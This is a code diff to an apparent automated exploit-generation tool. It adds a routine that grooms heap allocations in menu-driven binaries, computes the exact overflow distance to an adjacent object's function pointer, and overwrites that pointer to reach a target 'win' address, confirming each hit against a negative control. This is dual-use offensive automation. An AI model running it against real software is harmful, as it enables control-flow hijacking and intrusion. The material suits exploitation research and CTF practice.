@@ -296,6 +296,17 @@ def chain_primitive_stage(ctx) -> dict:
                                     blame=(f"option {writer} overwrites a code pointer at +{off}"
                                            + undersized),
                                     writer=writer, off=off, trig=trig, exe=exe)
+                # The brute offset walk above tops out at a 64-byte reach; a large overflow buffer
+                # puts the victim's code pointer request2size(size) bytes on, past that window.
+                # Fall back to the allocator-model-COMPUTED distance, which has no such cap.
+                comp = _computed_adjacent_hijack(ctx, capture, opts, model, width, win_addr)
+                if comp:
+                    seq, buf_opt, obj_opt, writer, dist, trig = comp
+                    return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq,
+                                    blame=(f"option {writer} overflows a {buf_opt}-allocated buffer "
+                                           f"into the adjacent {obj_opt}-allocated object's code "
+                                           f"pointer at computed +{dist} (request2size-exact)"),
+                                    writer=writer, off=dist, trig=trig, exe=exe)
         finally:
             shutil.rmtree(helper.parent, ignore_errors=True)
 
@@ -557,6 +568,94 @@ def _search_hijack(ctx, capture, prime, model, writers, triggers, win_addr, *, w
                         ctx.progress(msg=f"hijack: option {writer} (obj {widx.decode()}) writes "
                                          f"a code pointer at +{off} -> win reached")
                         return seq, writer, off, trig
+    return None
+
+
+def _computed_adjacent_hijack(ctx, capture, opts, model, width, win_addr):
+    """Adjacent-chunk overflow -> function-pointer hijack with the overflow distance COMPUTED
+    from the allocator model (`heap_groom`), not brute-forced.
+
+    `_search_hijack` walks a fixed 8..64-byte offset window. A large overflow buffer puts the
+    victim's chunk -- and the inline code pointer in it -- `request2size(size)` bytes away, far
+    past that window, so that search cannot reach it AT ALL (a malloc(0x100) buffer's neighbour
+    is 0x110 bytes on, not <=64). Here the groom picks the allocation size, so `heap_groom`
+    PROVES the exact adjacency distance (`request2size(size)+fptr_off`, via `TcacheModel`) and we
+    aim the overwrite straight at it -- no cap. The overflow buffer and the victim object are
+    allocated back to back so they land adjacent on the arena top; because we do not know which
+    option makes the victim (the one with the called pointer) or which calls it, we try each --
+    the oracle below keeps a wrong guess from ever confirming.
+
+    Same 0-false-confirmation oracle as every other hijack here: the win breakpoint must fire for
+    the real overwrite AND NOT for the negative control (the groom one word short of the pointer),
+    so a target that reaches win on its own, or via anything but our write, is rejected. Bounded
+    and best-effort; returns (seq, buf_opt, obj_opt, writer, distance, trig) or None.
+    """
+    from ..fuzz import menu
+    from . import exploit, heap_groom
+
+    buf_opts = [o for o in opts if o in model and menu._is_alloc(model[o])]
+    if not buf_opts:
+        return None
+    # The victim is whatever option creates the object with the inline pointer: an idx-led
+    # "make a default object" option is the usual shape, so try those first, then the allocating
+    # options themselves (a sized creator can be its own victim).
+    obj_opts = [o for o in opts if o in model and model[o][:1] == ["idx"]
+                and not menu._is_alloc(model[o])] + buf_opts
+    triggers = [o for o in opts if o in model and model[o][:1] == ["idx"]] or list(opts)
+
+    def _alloc(opt, idx, size):
+        f = model.get(opt, [])
+        return menu._scalar(opt.encode(), width) + menu._fill(
+            f, idx=idx, num=str(size).encode(), width=width)
+
+    def _edit(opt, idx, data):
+        # idx, [length,] then the raw overflow bytes WITHOUT a terminator -- an exact-length
+        # read() would otherwise leave a stray newline in the pipe and desync the trigger.
+        f = model.get(opt, [])
+        out = menu._scalar(opt.encode(), width) + menu._scalar(idx, width)
+        if "num" in f:
+            out += menu._scalar(str(len(data)).encode(), width)
+        return out + menu._data(data, width, term=False)
+
+    def _call(opt):
+        return menu._scalar(opt.encode(), width) + menu._fill(
+            model.get(opt, []), idx=b"1", width=width)
+
+    attempts = 0
+    # Sizes whose request2size lands the victim well past _search_hijack's 64-byte window, so this
+    # path is the only one that reaches them; both are common real "big buffer" allocations.
+    for size in (0x100, 0x90):
+        for fptr_off in (0, 8, 16, 24):
+            try:
+                plan = heap_groom.plan_adjacent_overflow(size, win_addr, obj_fptr_off=fptr_off)
+            except Exception:                            # noqa: BLE001 -- model mismatch; skip size
+                continue
+            for buf_opt in buf_opts:
+                for obj_opt in obj_opts:
+                    for writer in opts:
+                        for trig in triggers:
+                            if ctx.should_cancel() or attempts >= 300:
+                                return None
+                            attempts += 1
+                            spec = heap_groom.MenuSpec(
+                                alloc_buf=lambda sz, b=buf_opt: _alloc(b, b"0", sz),
+                                alloc_obj=lambda o=obj_opt: (
+                                    _alloc(o, b"1", 0x18) if menu._is_alloc(model.get(o, []))
+                                    else _call(o)),
+                                edit_buf=lambda data, w=writer: _edit(w, b"0", data),
+                                trigger=lambda t=trig: _call(t),
+                            )
+                            pos = heap_groom.lower(plan, spec)
+                            if not exploit.reached(capture(pos, breakpoints=[win_addr]), win_addr):
+                                continue
+                            neg = heap_groom.lower(plan, spec, negative=True)
+                            if exploit.reached(capture(neg, breakpoints=[win_addr]), win_addr):
+                                continue                 # reached without our overwrite -> not ours
+                            ctx.progress(msg=(
+                                f"computed hijack: {buf_opt} size {size:#x} + {obj_opt}, option "
+                                f"{writer} overflows a code pointer at computed "
+                                f"+{plan.overflow_distance} -> win reached"))
+                            return pos, buf_opt, obj_opt, writer, plan.overflow_distance, trig
     return None
 
 
